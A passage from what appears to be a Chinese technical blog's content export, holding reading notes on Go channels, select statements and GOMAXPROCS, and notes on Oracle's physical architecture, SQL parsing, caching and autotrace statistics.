channel 上等待，而不是在 channel 上写 n 次来打开每个 goroutine,你可以简单地关闭 channel。由于一个被关闭的 channel 可以被无数次读取，所以不管有多少 goroutine 在等待它，关闭 channel 都比执行 n 次更适合，也更快。这里有一个例子，可以同时打开多个 goroutine:\npackage mainimport (\t&quot;fmt&quot;\t&quot;sync&quot;)func main() &#123;\tbegin := make(chan any)\tvar wg sync.WaitGroup\tfor i := 0; i &lt; 5; i++ &#123;\t\twg.Add(1)\t\tgo func(i int) &#123;\t\t\tdefer wg.Done()\t\t\t&lt;-begin // goroutine会一直等待，直到它被告知可以继续。\t\t\tfmt.Printf(&quot;%v has begun\\n&quot;, i)\t\t&#125;(i)\t&#125;\tfmt.Println(&quot;Unblocking goroutines...&quot;)\tclose(begin) // 关闭channel,从而同时打开所有的goroutine。\twg.Wait()&#125;\n\n你可以看到，在我们关闭开始channel之前，所有的goroutine都没有开始运行：\nUnblocking goroutines...4 has begun2 has begun3 has beguno has begun1 has begun\n\n请记住在本章前面“sync包”中，我们讨论了使用sync.Cond类型执行相同的行为。你当然可以使用它，但是正如我们已经讨论过的，channel是可组合的。我们还可以创建 buffered channel,它是在实例化时提供容量的 channel。这意味着即使没有在 channel 上执行读取操作，goroutine 仍然可以执行 n 写入，其中 n 是缓冲 channel 的容量。dataChan := make(chan any, 4)创建一个有4个容量的缓冲channel。 这意味着我们可以把4个东西放到 channel 上，不管它是否被读取。这有点意思，因为它意味着 goroutine 可以控制实例化一个 channel 时否需要缓冲。这表明，创建一个 channel 应该与 goroutines 紧密耦合，而 goroutines 将会在它上面执行写操作，这样我们就可以更容易地推断它的行为和性能。\n没有缓冲的 channel 也被定义为缓冲 channel,一个无缓冲channel只是一个以0的容量创建的缓冲channel。a := make(chan any)和b := make(chan any, 0) 是等价的。请记住，当我们讨论阻塞时，如果说 channel 是满的，那么写入 channel 阻塞，如果 channel 是空的，则从 channels 读取的是什么？“Full”和“empty”是容量或缓冲区大小的函数。无缓冲channel的容量为零，因此在任何写人之前channel已经满了。一个没有下游接受的容量为4的缓冲channel在被写4次之后就满了，并且在写第5次的时候阻塞，因为它没有其他地方放置第五个元素。与未缓冲的channel一样，缓冲channel仍然阻塞；channel为空或满的前提条件是不同的。通过这种方式，缓冲channel是一个内存中的FIFO队列，用于并发进程进行通信。\n为了帮助理解这一点，让我们用例子来解释一个具有4个容量的缓冲 channel 的情况。首先，让我们来初始化： c ：= make(chan rune, 4)从逻辑上讲，这创建了一个带有四个槽的缓冲区。现在让我们往channel里写数据： c &lt;- &#39;A&#39;当这个channel没有下游读取时，一个数据将被放置在channel缓冲区的第一个槽中。然后 c &lt;- &#39;B&#39;、c &lt;- &#39;C&#39;、c &lt;- &#39;D&#39;，经过4次写入后，缓冲区已满。再试图写入 c &lt;- &#39;E&#39;，执行这个写入操作的 goroutine 将被阻塞，直到有读取操作。下游读取时会依次接受位于缓冲区中的数据，直到缓冲区为空。\n如果一个缓冲 channel 是空的，并且有一个下游接收，那么缓冲区将被忽略，并且该值将直接从发送方传递到接收方。在实践中这是透明的，但是对了解缓冲channel的配置是值得的。缓冲 channel 在某些情况下是有用的，但是应该小心地创建它们。缓冲channel很容易成为一个不成熟的优化，并且使隐藏的死锁更不容易发生。这听起来像是一件好事，但我猜你宁愿在第一次写代码的时候发现死锁，而不是在生产系统崩遗的时候才发现。\n程序如何与值为 nil 的 channel 交互？\nvar dataStream chan interface&#123;&#125;// 读取&lt;-dataStream// 写入dataStream &lt;- struct&#123;&#125;&#123;&#125;\n\n会报错：fatal error: all goroutines are asleep - deadlock!尝试close(dataStream)也会报错：panic: close of nil channel\n\nchannel 操作的结果给出了 channel 的状态：\n\n\n\n操作\nChannel 状态\n结果\n\n\n\nRead\nnil\n阻塞\n\n\nRead\n打开且非空\n输出值\n\n\nRead\n打开且空\n阻塞\n\n\nRead\n关闭\n&lt;默认值&gt;,false\n\n\nRead\n只写\n编译错误\n\n\nWrite\nnil\n阻塞\n\n\nWrite\n打开但填满\n阻塞\n\n\nWrite\n打开且不满\n写入值\n\n\nWrite\n关闭\npanic\n\n\nWrite\n只读\n编译错误\n\n\nClose\nnil\npanic\n\n\nClose\n打开且非空\n关闭Channel，读取成功，直到缓存被读完，然后读取生产者的默认值\n\n\nClose\n打开且空\n关闭Channel，读取生产者的默认值\n\n\nClose\n关闭\npanic\n\n\nClose\n只读\n编译错误\n\n\nchannel是吸引人们使用Go语言的原因之一。结合了goroutine和闭包的简单性，我很清楚地知道编写干净、正确的并发代码是多么容易。在很多方面，channel是将goroutine黏合在一起的黏合剂。本章应该给了你一个关于什么是channel以及如何使用它们的很好的概述。真正的乐趣始于我们开始编写channel以形成高阶并发设计模式。我们会在下一章讲到。\n期待。\nselect 语句select语句是将channel绑定在一起的黏合剂，这就是我们如何在一个程序中组合channel以形成更大的抽象事务的方式。声明select语句是一个具有并发性的Go语言程序中最重要的事情之一，这并不是夸大共词。在一个系统中两个或多个组件的交集中，可以在本地、单个函数或类型以及全局范围内找到select语句绑定在一起的channel。除了连接组件之外，在程序中的这些关键节点上，select语句可以帮助安全地将channel与诸如取消、超时、等待和默认值之类的概念结合在一起。\n那么这些强大的select语句是什么呢？我们如何使用它们，它们是如何工作的？让我们先把它放出来。这里有一个很简单的例子：\npackage mainfunc main() &#123;\tvar c1, c2 &lt;-chan any\tvar c3 chan&lt;- any\tselect &#123;\tcase &lt;-c1:\t\t//执行某些逻辑\tcase &lt;-c2:\t\t//执行某些逻辑\tcase c3 &lt;- struct&#123;&#125;&#123;&#125;:\t\t// 执行某些逻辑\t&#125;&#125;\n\n它看起来有点像一个选择模块，一个select模块包含一系列的case语句，这些语句可以保护一系列语句。然而，这就是相似之处。与switch块不同，select块中的case语句没有测试顺序，如果没有满足任何条件，执行也不会失败。\n相反，所有的channel读取和写入都需要查看是否有任何一个已准备就绪可以用的数据：在读取的情况下关闭channel,以及写入不具备下游消费能力的channel。如果所有channel都没有谁备好，则执行整个select语句模块。当一个channel准备好了，这个操作就会继续，它相应的语句就会执行。让我们来看一个简单的例子：\npackage mainimport (\t&quot;fmt&quot;\t&quot;time&quot;)func main() &#123;\tstart := time.Now()\tc := make(chan any)\tgo func() &#123;\t\t// 等待5s后关闭channel\t\ttime.Sleep(5 * time.Second)\t\tclose(c)\t&#125;()\tfmt.Println(&quot;Blocking on read...&quot;)\tselect &#123;\tcase &lt;-c:\t\t// 尝试在channel上读取数据\t\tfmt.Printf(&quot;Unblocked %v later.\\n&quot;, time.Since(start))\t&#125;&#125;\n\n输出如下：\nBlocking on read...Unblocked 5.0109829s later.\n\n在进人select模块后大约5秒，我们就会解锁。这是一种简单而有效的方法来阻止我们等待某事的发生，但如果我们思考一下，我们可以提出一些问题：\n\n当多个channel有数据可供给下游读取的时候会发生什么？\n如果没有任何可用的channel怎么办？\n如果我们想要做一些事情，但是没有可用的channels怎么办？\n\npackage mainimport (\t&quot;fmt&quot;)func main() &#123;\tc1 := make(chan any)\tclose(c1)\tc2 := make(chan any)\tclose(c2)\tvar c1Count, c2Count int\tfor i := 1000; i &gt; 0; i-- &#123;\t\tselect &#123;\t\tcase &lt;-c1:\t\t\tc1Count++\t\tcase &lt;-c2:\t\t\tc2Count++\t\t&#125;\t&#125;\tfmt.Printf(&quot;c1Count:%d\\nc2Count:%d\\n&quot;, c1Count, c2Count)&#125;\n\n输出如下：\nc1Count:485c2Count:515\n\n在一千次迭代中，大约有一半的时间从c1读取se1ect语句，大约一半的时间从c2读取。这看起来很有趣，也许有点太巧了。事实如此！Go 语言运行时将在一组case语句中执行伪随机选择。这就意味着，在你的case语句集合中，每一个都有一个被执行的机会。乍一看，这似乎并不重要，但背后的原因却非常有趣。让我们先做一个很明显的阐述：Go语言运行时无法解析select语句的意图，也就是说，它不能推断出问题空间，或者说为什么将一组channel组合到一个select语句中。正因为如此，运行时所能做的最好的事情就是在平均情况下运行良好。一种很好的方法是将一个随机变量引入到等式中（在这种情况下，se1ect后续的channel)。通过加权平均每个channel被使用的机会，所有使用select语句的程序将在平均情况下表现良好。\n关于第二个问题：如果没有任何channel可用，会发生什么？如果所有的channel都被阻塞了，如果没有可用的，但是你可能不希望永远阻塞，可能需要超时机制。Go语言的time包提供了一种优雅的方式，可以在select语句中很好地使用channel。这里有一个例子：\npackage mainimport (\t&quot;fmt&quot;\t&quot;time&quot;)func main() &#123;\tvar c &lt;-chan int\tselect &#123;\tcase &lt;-c:\tcase &lt;-time.After(1 * time.Second):\t\tfmt.Println(&quot;Timed out.&quot;)\t&#125;&#125;\n\n这个case语句永远不会被解锁，因为我们是从 nil channel 读取的。输出如下：Timed out.time.After 函数通过传入 time.Duration 参数返回一个数值并写入 channel,该channel会返回执行后的时间。这为select语句提供了一种简明的方法。\n最后一个问题：当没有可用channel时，我们需要做些什么？像case语句一样，select语句也允许默认的语句。就像“case”语句一样，当“select’”语句中的所有channel都被阻塞的时候，“select”语句也允许你调用默认语句。以下是一个实例：\npackage mainimport (\t&quot;fmt&quot;\t&quot;time&quot;)func main() &#123;\tstart := time.Now()\tvar c1, c2 &lt;-chan int\tselect &#123;\tcase &lt;-c1:\tcase &lt;-c2:\tdefault:\t\tfmt.Printf(&quot;In default after %v\\n&quot;, time.Since(start))\t&#125;&#125;\n\n输出如下：In default after 0s可以看到，它几乎是瞬间运行了默认语句。这允许在不阻塞的情况下退出 select 模块。通常，你将看到一个默认的子句，它与 for-select 循环一起使用。这允许goroutine在等待另一个goroutine上报结果的同时，可以继续执行自己的操作。这里有一个例子：\npackage mainimport (\t&quot;fmt&quot;\t&quot;time&quot;)func main() &#123;\tdone := make(chan interface&#123;&#125;)\tgo func() &#123;\t\ttime.Sleep(5 * time.Second)\t\tclose(done)\t&#125;()\tworkCounter := 0loop:\tfor &#123;\t\tselect &#123;\t\tcase &lt;-done:\t\t\tbreak loop\t\tdefault:\t\t&#125;\t\t// 模拟工作行为\t\tworkCounter++\t\ttime.Sleep(1 * time.Second)\t&#125;\tfmt.Printf(&quot;Achieved %v cycles of work before signalled to stop.\\n&quot;, workCounter)&#125;\n\n输出如下：Achieved 5 cycles of work before signalled to stop.\n在这种情况下，我们有一个循环，它在执行某种操作，偶尔检查它是否应该被停止。最后，对于空的select语句有一个特殊的情况：选择没有case子句的语句。看起来像这样： select {} 这个语句将永远阻塞。在第6章中，我们将深入研究select语句是如何工作的。从更高层次的角度来看，它应该是显而易见的，它可以帮助你安全高效地组合各种概念和子系统。\nGOMAXPROCS 控制在runtime包中，有一个函数称为GoMAXPR0CS。这个名称是有误导性的：人们通常认为这个函数与主机上的逻辑处理器的数量有关（而且与它调度方式有关)，但实际上这个函数控制的OS线程的数量将承载所谓的“工作队列”。有关这个函数的更多信息以及它的工作原理，请参见第6章。在Go语言1.5之前，GoMAXPR0CS总是被设置为1，通常你会在大多数Go语言程序中找到这段代码：runtime.GOMAXPROCS(runtime.NumCPU())几乎大部分开发人员希望当他们的程序正在运行时，可以充分利用机器上的所有CPU核心。（我还真干过）因此，在随后的Go语言版本中，它自动设置为主机上逻辑CPU的数量。\n那么为什么要调整这个值呢？大部分时间你都不太想去调节它。Go语言的调度算法在大多数情况下已经足够好了，在增加或减少工作队列和线程数量的情况下，可能会造成更多的问题，但是仍然有一些情况会改变这个值。例如，我在一个项目上调试，这个项目有一个测试组件，它被竞争环境困扰。不管怎么说，这个团队有几个包，有时候测试失败。我们运行测试的主机有四个逻辑CPU,因此在任何一个点上，我们都有四个goroutines同时执行。通过增加GoMAXPROCS以超过我们拥有的逻辑CPU数量，我们能够更频繁地触发竞争条件，从而更快地修复它们。\n其他人可能通过实验发现，他们的程序在一定数量的工作队列和线程上运行得更好，但我更主张谨慎些。如果你通过调整这个方法来压缩性能，那么在每次提交之后，当你使用不同的硬件，以及使用不同版本的Go语言时，一定要这样做。调整这个值会使你的程序更接近它所运行的硬件，但以抽象和长期性能稳定为代价。\n","categories":["读书笔记"],"tags":["go","并发","《go语言并发之道》"]},{"title":"《收获，不止Oracle》读书笔记上篇-开始和物理体系","url":"/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/%E3%80%8A%E6%94%B6%E8%8E%B7%EF%BC%8C%E4%B8%8D%E6%AD%A2Oracle%E3%80%8B%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0%E4%B8%8A%E7%AF%87-%E5%BC%80%E5%A7%8B%E5%92%8C%E7%89%A9%E7%90%86%E4%BD%93%E7%B3%BB/","content":"前言由于想深入了解下数据库，包括索引、分区表以及sql优化相关的知识，加上工作使用的是 Oracle 数据库。所以选择这本书开始学习。最开始看的时候，已经看了四章了。但是不做笔记，总是看了后面忘了前面，所以决定重读并且记笔记。主要及一些重点，方便以后查阅和回忆。（当然，可能会有很多引用原文的部分，也会有自己的总结。引用的部分就不一一标注了，不过基本也能看出来）\n第一章 - 意识，少做事从学习开始这一章的重点就是，学什么要先了解做什么。学了没想过怎么用，或者干脆不用，基本上是白学的。先讲下数据库应用的基本功能，再根据具体的角色（DBA、开发、运维等）看具体该如何使用，根据使用的侧重点不同，而对数据库不同进行深度的学习。毕竟数据库体系是庞大的，想要全盘掌握不现实，也不必要。按需学习即可。\n这里作者是以手机的例子，加以二八现象说明。即百分之二十的功能实现百分之八十的需求，数据库也是一样。对于开发人员来说，首先应该了解 SQL 的编写，而不是数据库的备份和恢复。而对于运维或者DBA来说，了解数据库的备份和恢复则更为重要。\n首先，数据库应用的功能主要分为 数据库开发、数据库管理、数据库优化、数据库设计 四类（当然只是大概）。侧重点如下：\n\n开发：能利用SQL完成数据库的查增删改的基本操作：能用PL&#x2F;SQL完成及各类逻辑的实现。\n管理：能完成数据库的安装、部署、参数调试、备份恢复、数据迁移等系统相关的工作：能完成分配用户、控制权限、表空间划分等管理相关工作：能进行故障定位、问题分析等数据库诊断修复相关工作。\n优化：在深入了解数据库的运行原理的基础上，利用各类工具及手段发现并解决数据库存在的性能问题，从而提升数据库运行效率，这个说着轻巧，其实很不容易。\n设计：深刻理解业务需求和数据库原理，合理高效地完成数据库模型的建设，设计出各类表及索引等数据库对象，让后续应用开发可以高效稳定。\n\n\n我的角色目前是开发，后续笔记中也会侧重于开发的内容。除此之外，也会带一些我感兴趣的内容。\n第二章 - 震惊，体验物理体系之旅不论什么角色，基础原理都是必学的。首先就是物理体系结构，平时遇到的各种数据库相关问题，很多都可以从中找到解决方法。\n\n\nOracle由实例和数据库组成，我特意用两个虚框标记出来，上半部的直角方框为实例instance,下半部的圆角方框为数据库Database,大家可以看到我在虚线框左上角做的标注。\n实例是由一个开辟的共享内存区SGA(System Global Area)和一系列后台进程组成的，其中SGA最主要被划分为共享池(shared pool)、数据缓存区(db cache)和日志缓存(log buffer)三类。后台进程包括图2-2中所示的PMON、SMON、LCKn、RECO、CKPT、DBWR、LGWR、ARCH等系列进程。\n数据库是由数据文件、参数文件、日志文件、控制文件、归档日志文件等系列文件组成的，其中归档日志最终可能会被转移到新的存储介质中，用于备份恢复使用。大家请注意看图2-2中的圆形虚线框标记部分的一个细节，PGA(Program Global Area)区，这也是一块开辟出来的内存区，和SGA最明显的差别在于，PGA不是共享内存，是私有不共亨的，S理解为共享的首字母。用户对数据库发起的无论查询还是更新的任何操作，都是在PGA先预处理，然后接下来才进入实例区域，由SGA和系列后台进程共同完成用户发起的请求。\nPGA起到的其体作用，也就是前面说的预处理，是什么呢？主要有三点：第一，保存用户的连接信息，如会话属性、绑定变量等：第二，保存用户权限等重要信息，当用户进程与数据库建立会话时，系统会将这个用户的相关权限查询出来，然后保存在这个会话区内：第三，当发起的指令需要排序的时候，PGA(Program Global Area)正是这个排序区，如果在内存中可以放下排序的尺寸，就在内存PGA区内完成，如果放不下，超出的部分就在临时表空间中完成排序，也就是在磁盘中完成排序。\n我在图中标识了三块区域（大家注意看虚线框的左下角标注），分别是1区圆形虚线框，2区直角方形虚线框，3区圆角方形虚线框。用户的请求发起经历的顺序一般如下：1区→2区→3区：或者1区→2区。\n\n从这个体系结构可以提出一些问题，提问很重要！\n\n为什么会有用户的请求不经过3区数据库的情况，直接从2区实例返回了？\n为什么SGA要划分为共享池、数据缓存区、日志缓存区，它们的作用分别是什么？\n为什么数据量大时排序会导致sql执行非常缓慢？（这个问题从上面的体系结构中显而易见）\n\n从普通查询 sql 开始从简单的查询sql select object_name from t where object_id=29; 开始。当用户发起这个sql指令后，首先会从1区开始做准备。\nPGA区域是仅供当前发起用户使用的私有内存空间，这个区域有三个作用，但这里的连接只完成了用户连接信息的保存和q权限的保存。只要该session不断开连接，下次便可以直接从PGA中获取，而不用去硬盘中读取数据。此外，该sql还会匹配成一条唯一的HASH值，然后进入2区域。首先进入SGA区的共享池。进入共享池后，先查询是否有地方存储过这个sql（HASH值，唯一标识一个sql）。\n如果没有，那首先就要查询这个sql语法是否正确（from是否写成form），语义是否正确（字段、表是否存在），是否有权限。都没问题则会生成唯一HASH并保存。接下来开始解析，看是否有索引，是索引读高效还是全表扫描高效？oracle要做出抉择。\n如何做出抉择？将两种方式都估算一下，看那个代价（COST）更低。这里比较并不会真正分别执行两次来比较，具体方法后文会有。将代价更低的执行计划保存起来，并于HASH对应起来。有了执行计划之后，便来到数据缓存区来查询数据了。当数据缓存区找不到需要的数据时，便会去3区的数据库中查找，当然得按照执行计划来，这是圣旨，不可违抗。找到后，回到数据缓存区返回，找不到，就找不到了。\n\n这里2区中的日志缓存区并没有说到\n3区也只描述了一个数据文件，其他文件并没有被提及\n2区中除了SGA，还有很多进程，他们的作用也没有被提及\n\n下面开始实践，可以先跳至文末，搭建Oracle的环境。\ndrop table t;create table t asselect *from all_objects;create index idx_object_id on t (object_id);-- 跟踪SQL的执行计划和执行的统计信息set autotrace on-- 设置查询结果在屏幕上显示时每行的最大字符数，使得查询结果不被截断，提高可读性set linesize 1000-- 跟踪该语句执行完成的时间set timing onselect object_namefrom twhere object_id = 29;\n\n第一次查询结果\nSQL&gt; select object_name from t where object_id = 29;OBJECT_NAME--------------------------------------------------------------------------------------------------------------------------------C_COBJ#Elapsed: 00:00:00.67Execution Plan----------------------------------------------------------Plan hash value: 1296629646-----------------------------------------------------------------------------------------------------| Id  | Operation                           | Name          | Rows  | Bytes | Cost (%CPU)| Time     |-----------------------------------------------------------------------------------------------------|   0 | SELECT STATEMENT                    |               |     1 |    79 |     2   (0)| 00:00:01 ||   1 |  TABLE ACCESS BY INDEX ROWID BATCHED| T             |     1 |    79 |     2   (0)| 00:00:01 ||*  2 |   INDEX RANGE SCAN                  | IDX_OBJECT_ID |     1 |       |     1   (0)| 00:00:01 |-----------------------------------------------------------------------------------------------------Predicate Information (identified by operation id):---------------------------------------------------   2 - access(&quot;OBJECT_ID&quot;=29)Note-----   - dynamic statistics used: dynamic sampling (level=2)Statistics----------------------------------------------------------         11  recursive calls          0  db block gets         83  consistent gets          1  physical reads          0  redo size        594  bytes sent via SQL*Net to client        108  bytes received via SQL*Net from client          2  SQL*Net roundtrips to/from client          0  sorts (memory)          0  sorts (disk)          1  rows processed\n\n第二次查询结果：\nSQL&gt; select object_name from t where object_id = 29;OBJECT_NAME--------------------------------------------------------------------------------------------------------------------------------C_COBJ#Elapsed: 00:00:00.27Execution Plan----------------------------------------------------------Plan hash value: 1296629646-----------------------------------------------------------------------------------------------------| Id  | Operation                           | Name          | Rows  | Bytes | Cost (%CPU)| Time     |-----------------------------------------------------------------------------------------------------|   0 | SELECT STATEMENT                    |               |     1 |    79 |     2   (0)| 00:00:01 ||   1 |  TABLE ACCESS BY INDEX ROWID BATCHED| T             |     1 |    79 |     2   (0)| 00:00:01 ||*  2 |   INDEX RANGE SCAN                  | IDX_OBJECT_ID |     1 |       |     1   (0)| 00:00:01 |-----------------------------------------------------------------------------------------------------Predicate Information (identified by operation id):---------------------------------------------------   2 - access(&quot;OBJECT_ID&quot;=29)Note-----   - dynamic statistics used: dynamic sampling (level=2)Statistics----------------------------------------------------------          0  recursive calls          0  db block gets          4  consistent gets          0  physical reads          0  redo size        594  bytes sent via SQL*Net to client        108  bytes received via SQL*Net from client          2  SQL*Net roundtrips to/from client          0  sorts (memory)          0  sorts (disk)          1  rows processed\n\n先简单介绍下统计信息中各个信息的含义：\n\nRecursive Calls: 表示查询执行期间数据库内部发生的递归调用次数，这可能包括子查询、视图的重写以及其他内部处理所需的多次查询执行。\nDB Block Gets: 指从数据库缓存区中读取数据块的次数，反映的是从内存中获取数据的频率。\nConsistent Gets: 代表为维护数据一致性而从数据库缓存中获取数据块的次数。这在读一致性要求高的查询中尤为重要，确保查询看到的是事务开始那一刻的数据版本。\nPhysical Reads: 指从磁盘上实际读取数据块的次数，发生物理读取通常意味着所需数据未在数据库缓存区中找到，需要从持久存储中加载。\nRedo Size: 记录由于本次操作产生的重做日志大小，单位通常是字节。重做日志用于事务恢复。\nBytes Sent via SQLNet to Client: 通过SQLNet网络协议发送到客户端的数据量，包括查询结果集等信息。\nBytes Received via SQLNet from Client: 通过SQLNet网络协议从客户端接收的数据量，主要涉及客户端发送的查询请求等。\nSQL*Net Roundtrips to&#x2F;from Client: 完成查询操作所需的客户端与服务器之间的网络往返次数，每次往返可能涉及请求或响应。\nSorts (Memory): 在内存中执行的排序操作次数，用于组织数据以便于高效查询或显示。\nSorts (Disk):当内存不足，需要使用临时表空间在磁盘上进行排序操作的次数，这通常比内存排序效率低。\nRows Processed: 查询最终处理的行数，即查询结果集中包含的行数。\n\n第一次执行花费0.67秒，第二次只花费了0.27秒。比第一次快了很多接下来是统计信息的差别第一次执行，产生了11次递归调用、83次逻辑读、1次物理读第二次执行，产生了0次递归调用、4次逻辑读、0次物理读\n下面是描述两次执行的差异：\n\n用户首次执行该SQL指令时，该指令从磁盘中获取用户连接信息和相关权限信息权限，并保存在PGA内存里。当用户再次执行该指令时，由于SESSION之前未被断开重连，连接信息和相关权限信息就可以在PGA内存中直接获取，避免了物理读。\n首次执行该SQL指令结束后，SGA内存区的共享池里已经保存了该SQL唯一指令HASH值，并保留了语法语意检查及执行计划等相关解析动作的劳动成果，当再次执行该$QL时，由于该SQL指令的HASH值和共享池里保存的相匹配了，所以之前的硬解析动作就无须再做，不仅跳过了相关语法语意检查，对于该选取哪种执行计划也无须考虑，直接拿来主义就好了。\n首次执行该SQL指令时，数据一般不在SGA的数据缓存区里（除非被别的SQL读入内存了)，只能从磁盘中获取，不可避免地产生了物理读，但是由于获取后会保存在数据缓存区里，再次执行就直接从数据缓存区里获取了，完全避免了物理读，就像上面的实践一样，首次执行物理读为4，第2次执行的物理读为0，没有物理读，数据全在缓存中，效率当然高得多！\n\n即，不用获取用户和权限相关信息、不用进行语法检查和执行计划等相关解析、不用从磁盘获取直接从缓存获取。\n体会Oracle的代价在表有索引的情况下，Oracle可以选择索引读，也可以选择全表扫描，这是两种截然不同的执行计划，不见得一定是索引读胜过全表扫，有时索引读的效率会比全表扫更低所以Oracle的选择不是看是啥执行计划，而是判断谁的代价更低。下面来比较下两者的代价\n这里会使用 HINT 的写法。HINT是一种强制写法，让数据库的查询优化器遵循某种特定的执行路径或采用特定的算法来处理查询。详细的介绍，放在文末。使用 /*+full(t)*/ 的写法，来强制该sql不走索引，走全表扫描。如下：select /*+full(t)*/object_name from t where object_id = 29;\n\n多次执行同一个SQL查询，可以解析次数减少、物理读减少甚至递归调用次数\n\n下面是走全表扫描的执行结果：\nSQL&gt; select /*+full(t)*/object_name from t where object_id = 29;OBJECT_NAME--------------------------------------------------------------------------------------------------------------------------------C_COBJ#Elapsed: 00:00:00.03Execution Plan----------------------------------------------------------Plan hash value: 1601196873--------------------------------------------------------------------------| Id  | Operation         | Name | Rows  | Bytes | Cost (%CPU)| Time     |--------------------------------------------------------------------------|   0 | SELECT STATEMENT  |      |     1 |    44 |   410   (0)| 00:00:01 ||*  1 |  TABLE ACCESS FULL| T    |     1 |    44 |   410   (0)| 00:00:01 |--------------------------------------------------------------------------Predicate Information (identified by operation id):---------------------------------------------------   1 - filter(&quot;OBJECT_ID&quot;=29)Statistics----------------------------------------------------------          0  recursive calls          0  db block gets       1514  consistent gets          0  physical reads          0  redo size        594  bytes sent via SQL*Net to client        108  bytes received via SQL*Net from client          2  SQL*Net roundtrips to/from client          0  sorts (memory)          0  sorts (disk)          1  rows processed\n\n比较走全表扫描和oracle自己选择的使用索引的方式的执行计划和统计信息，发现代价（Cost）410远大于2，1514次逻辑读也远大于4次。显而易见，走索引的方式代价更低。\n同时，选择的操作也比较艰难，缓存选择的结果，也能避免做重复的事情，提高效率。\n第一个问题这里已经有答案了，那就是有缓存的存在，使得后续相同的查询不需要经过3区数据库，直接从2区的缓存中获取结果并返回。\n再探体系结构原理从普通更新语句开始下面主要是二三问题的解答，即体系结构图中上面没有被提及到的组件、进程的作用是什么？\nsql语句除了上面的查询，还有更新语句，包括插入、修改、删除三类。如果是一个只读数据库，那么是不需要这么多组件的。下面以 update t set object_id=92 where object_id=29; 为例。\nsql执行过程前面和查询语句是一样的\n\n如果该用户并没有退出原连接去新建立一个连接，PGA区的用户连接信息和权限判断等诸多动作依然不用做，否则需要完成用户连接信息和权限判断等诸多动。\n如果该语句是第一次执行，在共享池里依然需要完成语法语意分析及解析，update t set object_id&#x3D;92 where object_id&#x3D;29指令中想匹配到object_id&#x3D;29的记录既可以用索引读，也可以用全表扫描，到底选用哪种执行计划需要根据代价的大小来选择。\n接下来进入数据缓存区，首次执行该数据一定不在缓存区里，也是和前面一样，先从磁盘中获取到缓存区中…\n\n到这里，查询语句将查询结果返回给用户，他的工作就结束了。但更新语句还有很多工作。\n在更新语句改写了缓存区的数据后，将启动DBWR进程将新的数据从内存刷入磁盘。进行持久化存储，否则内存断点后，数据会消失。\n日志缓存区保存了数据库相关操作的日志，记录了这个动作，然后由LGWR后台进程将其从日志缓存区这个内存区写进磁盘的日志文件里。目的很简单，就是为了便于将来出现异常情况时，可以根据日志文件中记录的动作，再继续执行一遍，从而保护数据的安全。\nOracle写日志是很重要的，LGWR进程会将日志缓存区持久化保存到日志文件。日志文件通常有多个，当第一个写满时，会写入第二个…当所有的日志文件都写满时，会重新从第一个开始覆写。所以在日志文件被覆写之前，需要将其备份出去，成为归档文件。由ARCH进程进行归档操作。\n关于提交 Commit当执行一条更新语句后，当前session再次查询是可以查询到更新后的数据的。但是其他session无法查询到更新后的，因为没有提交。\n提交 Commit 和 回滚 Rollback ，都是更新操作后，用户的确认。前者表示用户确认无误，确实需要更新；后者表示用户反悔了，撤销之前的操作。其中涉及到的细节会很多，这里只是简单描述。\nCommit操作，按照正常的逻辑，应该是执行之后，立刻被DBWR进程将更新后的数据写入磁盘，以便其他session查询到最新的数据和防止数据丢失。但事实上并非如此，因为频繁的写入操作性能较低，等数据缓存区累积到一定量时成批写入性能会更高。但这样无法兼顾数据安全。所以Commit操作之后，并不一定会立刻被DBWR进程将更新后的数据写入磁盘。很多事情都很难两全其美，和分布式系统中的CAP理论一样。但这里oracle做到了兼顾，下面来说oracle是如何做到的？\n因为oracle有日志缓存区和日志文件，在磁盘中记录了所有的操作，所以即便突然断电导致未提交的数据丢失，也可以通过日志文件重新执行之前的操作，从而恢复丢失的数据。那么数据缓存区是否越大越好呢？显然并不是，没有什么是极端的，需要从中取得平衡。数据缓存区越大，DBWR批量写入磁盘的效率越高，但断电恢复需要的时间就越长。反之也是一样\n下面介绍CKPT，什么时候将数据缓存区的数据写入磁盘是由CKPT触发的。如果更新操作的一直不提交，数据缓存区的数据会被写入磁盘中吗？答案是会的，因为DBWR将数据缓存区数据写入磁盘，不是由Commit决定的，而是由CKPT决定的。但当LGWR出现故障时，DBWR并不会听从CKPT的命令。会先等LGWR将日志缓存区的数据写入日志文件，才会完成数据缓存区写入磁盘的操作。因为凡是有记录，否则会发送数据丢失的问题。\n各主要进程总结\nPMON (Process Monitor):PMON负责监控和清理数据库实例中的失败或不响应的用户进程。当检测到一个用户进程异常终止时，PMON会执行清理工作，包括回滚未提交的事务、释放资源以及从进程表中删除相应的条目。如果遇到LGWR进程失败这样严重的问题，PMON可能会做出中止实例的激进操作，以防止数据混乱。此外，PMON还负责执行某些数据库的初始化任务，如打开监听器连接。\nSMON (System Monitor):SMON关注的是系统级的操作，而非单个进程。主要负责实例恢复工作，在数据库实例启动时执行实例恢复，包括应用联机重做日志以恢复未提交的事务，并清理实例崩溃后可能遗留的临时段。SMON还负责合并空间碎片、回收不再使用的临时段和回滚段。\nLCKn (Lock Process):LCKn是锁进程，仅用于RAC数据库。其中’n’代表编号，表示可以有多个这样的进程（最多可能有10个）。这些进程管理数据库中的锁，确保并发访问的一致性和数据完整性。它们负责授予和撤销对数据库对象的锁，以及解决锁冲突，确保多个用户或进程能够安全地并发访问数据库资源。\nRECO (Recovery Process):RECO用于处理分布式事务中的失败情况。当一个分布式事务的一部分在远程数据库中失败时，RECO会根据两阶段提交协议的记录，自动尝试完成或回滚未决的分布式事务，确保事务的原子性和一致性。\nCKPT (Checkpoint Process):用于触发DBWR从数据缓存区中写出数据到磁盘。CKPT执行越频繁，DBWR写出越频繁，DBWR写出越频繁越不能显示批量特性，性能就越低，但是数据库异常恢复的时候会越迅速。\nDBWR (Database Writer):DBWR负责将数据库缓存区缓存（Buffer Cache）中的脏数据块（已修改但尚未写入磁盘的数据）写入到数据文件中。这有助于释放缓存区空间，提高缓存命中率，并确保数据的一致性。通常，DBWR会有多个实例运行（DBW0, DBW1等），以并行处理大量I&#x2F;O操作。\nLGWR (Log Writer):LGWR负责将重做日志缓存区中的内容定期或在特定触发条件下（如事务提交、重做日志缓存区空间不足、检查点事件等）写入到在线重做日志文件中。这保证了数据库的事务可恢复性，即使在系统故障后也能恢复到一致状态。\nARCH (Archiver 